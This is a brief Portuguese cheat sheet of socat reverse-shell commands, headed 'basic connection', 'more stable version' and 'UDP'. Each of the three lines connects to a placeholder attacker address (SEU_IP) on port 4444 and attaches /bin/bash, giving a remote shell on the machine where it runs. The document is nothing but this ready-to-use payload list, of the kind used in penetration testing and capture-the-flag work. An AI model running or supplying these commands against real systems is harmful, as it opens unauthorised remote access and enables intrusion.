# Conexão básica
socat TCP:SEU_IP:4444 EXEC:'/bin/bash'

# Versão mais estável
socat TCP:SEU_IP:4444 EXEC:'/bin/bash',pty,stderr,setsid

# UDP
socat UDP:SEU_IP:4444 EXEC:'/bin/bash'
